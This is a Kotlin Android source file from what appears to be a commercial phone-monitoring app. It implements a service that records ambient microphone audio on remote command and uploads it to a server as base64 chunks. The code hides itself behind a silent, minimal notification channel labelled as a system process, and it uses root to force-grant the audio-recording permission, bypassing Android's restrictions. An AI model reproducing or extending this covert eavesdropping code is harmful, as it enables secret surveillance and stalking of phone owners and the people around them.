package com.surveillancepro.android.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.MainActivity
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.RootManager
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service d'ecoute audio ambiante (ROOT REQUIS pour contourner les restrictions).
 * 
 * Permet d'enregistrer l'environnement sonore de l'appareil a distance.
 * L'enregistrement est envoye au serveur en chunks pour ecoute en temps reel
 * ou stocke pour ecoute differee.
 * 
 * Modes disponibles :
 * - MODE_STREAM : Envoie l'audio en temps reel (chunks de 5 secondes)
 * - MODE_RECORD : Enregistre pendant une duree definie puis envoie
 */
class AmbientAudioService : Service() {

    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private var recordingThread: Thread? = null
    private var mode = MODE_RECORD
    private var durationSeconds = 30
    private var commandId: Long = 0

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        mode = intent?.getStringExtra(EXTRA_MODE) ?: MODE_RECORD
        durationSeconds = intent?.getIntExtra(EXTRA_DURATION, 30) ?: 30
        commandId = intent?.getLongExtra(EXTRA_COMMAND_ID, 0) ?: 0

        // Notification discrete
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        // Activer les permissions audio via root si disponible
        if (RootManager.isRooted()) {
            RootManager.executeRootCommand("appops set $packageName RECORD_AUDIO allow")
        }

        startRecording()
        return START_NOT_STICKY
    }

    private fun startRecording() {
        if (isRecording) return

        val sampleRate = 16000
        val channelConfig = AudioFormat.CHANNEL_IN_MONO
        val audioFormat = AudioFormat.ENCODING_PCM_16BIT
        val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat) * 2

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord failed to initialize")
                stopSelf()
                return
            }

            isRecording = true
            audioRecord?.startRecording()

            recordingThread = Thread {
                recordAudio(sampleRate, bufferSize)
            }
            recordingThread?.start()

            Log.d(TAG, "Ambient recording started (${durationSeconds}s, mode: $mode)")

        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied: ${e.message}")
            stopSelf()
        } catch (e: Exception) {
            Log.e(TAG, "Recording error: ${e.message}")
            stopSelf()
        }
    }

    private fun recordAudio(sampleRate: Int, bufferSize: Int) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) {
            stopSelf()
            return
        }

        val queue = EventQueue.getInstance(applicationContext)
        val buffer = ShortArray(bufferSize / 2)
        val outputStream = ByteArrayOutputStream()
        
        val startTime = System.currentTimeMillis()
        val endTime = startTime + (durationSeconds * 1000L)
        var chunkIndex = 0
        val chunkDurationMs = 5000L // 5 secondes par chunk en mode stream
        var lastChunkTime = startTime

        while (isRecording && System.currentTimeMillis() < endTime) {
            val readResult = audioRecord?.read(buffer, 0, buffer.size) ?: -1
            
            if (readResult > 0) {
                // Convertir en bytes
                for (i in 0 until readResult) {
                    val sample = buffer[i]
                    outputStream.write(sample.toInt() and 0xFF)
                    outputStream.write((sample.toInt() shr 8) and 0xFF)
                }

                // En mode stream, envoyer des chunks periodiques
                if (mode == MODE_STREAM && System.currentTimeMillis() - lastChunkTime >= chunkDurationMs) {
                    sendAudioChunk(queue, outputStream.toByteArray(), chunkIndex, sampleRate)
                    outputStream.reset()
                    chunkIndex++
                    lastChunkTime = System.currentTimeMillis()
                }
            }
        }

        // Envoyer le reste ou l'enregistrement complet
        val audioData = outputStream.toByteArray()
        if (audioData.isNotEmpty()) {
            if (mode == MODE_STREAM) {
                sendAudioChunk(queue, audioData, chunkIndex, sampleRate)
            } else {
                sendCompleteRecording(queue, audioData, sampleRate)
            }
        }

        stopSelf()
    }

    private fun sendAudioChunk(queue: EventQueue, audioData: ByteArray, chunkIndex: Int, sampleRate: Int) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val audioBase64 = Base64.encodeToString(audioData, Base64.NO_WRAP)

        queue.enqueue("ambient_audio_chunk", mapOf(
            "chunkIndex" to chunkIndex,
            "sampleRate" to sampleRate,
            "format" to "pcm_16bit",
            "durationMs" to (audioData.size / (sampleRate * 2) * 1000),
            "audioBase64" to audioBase64,
            "commandId" to commandId,
            "timestamp" to timestamp,
        ))

        Log.d(TAG, "Audio chunk $chunkIndex sent (${audioData.size} bytes)")
    }

    private fun sendCompleteRecording(queue: EventQueue, audioData: ByteArray, sampleRate: Int) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        
        // Limiter la taille (max 5 Mo)
        if (audioData.size > 5 * 1024 * 1024) {
            queue.enqueue("ambient_audio", mapOf(
                "status" to "too_large",
                "sizeBytes" to audioData.size,
                "durationSeconds" to durationSeconds,
                "commandId" to commandId,
                "timestamp" to timestamp,
            ))
            return
        }

        val audioBase64 = Base64.encodeToString(audioData, Base64.NO_WRAP)
        val actualDuration = audioData.size / (sampleRate * 2)

        queue.enqueue("ambient_audio", mapOf(
            "sampleRate" to sampleRate,
            "format" to "pcm_16bit",
            "durationSeconds" to actualDuration,
            "sizeBytes" to audioData.size,
            "audioBase64" to audioBase64,
            "commandId" to commandId,
            "status" to "recorded",
            "timestamp" to timestamp,
        ))

        Log.d(TAG, "Complete recording sent (${audioData.size} bytes, ${actualDuration}s)")
    }

    private fun stopRecording() {
        isRecording = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
        recordingThread = null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Services systeme",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Processus systeme"
            setShowBadge(false)
            setSound(null, null)
        }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val TAG = "AmbientAudioService"
        const val CHANNEL_ID = "ambient_audio_service"
        const val NOTIFICATION_ID = 1003
        const val EXTRA_MODE = "audio_mode"
        const val EXTRA_DURATION = "duration_seconds"
        const val EXTRA_COMMAND_ID = "command_id"
        const val MODE_STREAM = "stream"
        const val MODE_RECORD = "record"
    }
}
